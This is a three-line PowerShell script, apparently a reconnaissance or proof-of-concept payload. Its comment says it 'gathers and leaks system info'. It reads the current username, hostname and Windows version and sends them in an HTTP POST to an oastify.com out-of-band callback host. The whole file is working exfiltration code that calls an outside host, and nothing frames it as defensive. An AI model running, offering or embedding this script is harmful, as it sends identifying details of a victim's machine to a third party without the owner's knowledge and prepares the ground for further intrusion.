# info.ps1 - Gathers and leaks system info via HTTP POST
$data = whoami + "_" + hostname + "_" + (Get-WmiObject Win32_OperatingSystem).Caption
Invoke-WebRequest -Uri "http://58bnnq88b1bcciqgu6gvfo3sqjwck28r.oastify.com" -Method POST -Body $data
